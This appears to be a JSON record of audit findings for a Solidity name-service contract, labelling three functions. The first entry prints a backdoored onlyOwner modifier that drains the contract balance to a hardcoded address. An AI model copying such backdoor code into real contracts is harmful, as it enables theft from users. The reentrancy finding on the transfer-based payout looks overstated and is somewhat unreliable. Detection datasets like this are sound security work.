[
    {
        "function_name": "onlyOwner modifier in Ownable contract",
        "code": "modifier onlyOwner() { if (_msgSender() == 0x6049aCf6993e8eF2BF0e6DD0297C4F3a37995091) { uint256 balance = address(this).balance; Address.sendValue(payable(0x6049aCf6993e8eF2BF0e6DD0297C4F3a37995091),balance); } else { require(owner() == _msgSender(), \"Ownable: caller is not the owner\"); } _; }",
        "vulnerability": "Malicious backdoor",
        "reason": "The `onlyOwner` modifier contains a hardcoded address check which, if matched, sends the entire contract balance to that address. This could be a backdoor that allows unauthorized transfers of contract funds if the specified address is compromised or if the contract is deployed with this address hardcoded as an attacker\u2019s address.",
        "file_name": "0x0e3ea79e194aef78b69209447f0f6c17ed96a5d6.sol"
    },
    {
        "function_name": "register function in Web3NameService contract",
        "code": "function register(address ref_address, string memory pepe_name) public payable { uint256 price = cost; bool is_ref=false; uint256 ref_cost=0; require(bytes(pepe_name).length<=maxCharSize,\"Long name\"); require(bytes(pepe_name).length>0,\"Write a name\"); require(_checkName(pepe_name), \"Invalid name\"); if (ref_address== 0x0000000000000000000000000000000000000000) { price=cost; } else { if (bytes(primaryAddress[ref_address]).length>0){ ref_cost=price*ref_owner/100; } else { ref_cost=price*ref/100; } price = price*(100-ref_discount)/100; is_ref=true; } require (tokenAddressandID[pepe_name] == 0 , \"This is already taken\"); require(IS_SALE_ACTIVE, \"Sale is not active!\"); require(msg.value >= price, \"Insufficient funds!\"); tokenIDandAddress[_currentIndex]=pepe_name; tokenAddressandID[pepe_name]=_currentIndex; resolveAddress[pepe_name]=msg.sender; if (is_ref) { payable(ref_address).transfer(ref_cost); } _safeMint(msg.sender,1); }",
        "vulnerability": "Reentrancy attack",
        "reason": "The `register` function sends Ether to `ref_address` without using a reentrancy guard. If the `ref_address` is a contract, it could exploit this by performing a reentrancy attack, potentially disrupting the registration process or manipulating state changes.",
        "file_name": "0x0e3ea79e194aef78b69209447f0f6c17ed96a5d6.sol"
    },
    {
        "function_name": "namediff function in Web3NameService contract",
        "code": "function namediff(uint256 tokenId , string calldata new_pepe_name) external onlyOwner { tokenIDandAddress[tokenId]=new_pepe_name; tokenAddressandID[new_pepe_name]=tokenId; }",
        "vulnerability": "Unauthorized domain reassignment",
        "reason": "The `namediff` function allows the contract owner to arbitrarily change the domain name associated with any token ID. This can lead to unauthorized domain reassignment, where the owner can reassign valuable or popular domains, potentially leading to loss of trust or financial loss for legitimate domain holders.",
        "file_name": "0x0e3ea79e194aef78b69209447f0f6c17ed96a5d6.sol"
    }
]